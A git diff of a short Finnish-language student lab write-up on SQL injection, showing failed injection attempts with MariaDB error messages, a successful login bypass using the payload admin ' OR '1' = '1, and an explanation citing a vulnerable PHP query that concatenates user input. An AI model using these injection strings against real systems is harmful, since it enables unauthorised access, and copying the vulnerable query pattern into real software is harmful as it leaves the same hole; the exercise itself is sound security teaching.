@@ -1,4 +1,5 @@
 Mitä teit ja mitä sait aikaan?
+
 ' -- SELECT * FROM käyttäjät WHERE nimi = 'seppo'
 Virhe: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '' at line 1
 
@@ -8,9 +9,15 @@ Virhe: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error
 ' UNION SELECT * FROM käyttäjät WHERE käyttäjä = 'seppo' --
 Virhe: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'UNION SELECT * FROM käyttäjät WHERE käyttäjä = 'seppo' --', '' UNION SE...' at line 1
 
-'
-Virhe: SQLSTATE[21S01]: Insert value list does not match column list: 1136 Column count doesn't match value count at row 1
+käyttäjä: admin ' OR '1' = '1
+salasana: admin ' OR '1' = '1
+Pääsin sisään ilman oikeita tunnuksia
 
 
 Mitä pellin alla tapahtuu, miksi hyökkäys onnistui?
-Ei onnistunut höh...
+Koodi palauttaa aina TRUE, koska yksi on aina yksi eli TRUE. Koodia ei siis ole suojattu sql-injektiolta. Sen takia käyttäjä jolla ei ole oikeita tunnuksia pääsee ohjelmaan sisälle.
+
+Koodissa on luultavasti jossain kohtaa tälläinen kohta:
+$sql = "SELECT * FROM users 
+        WHERE username = '$username'
+        AND password = '$password'";
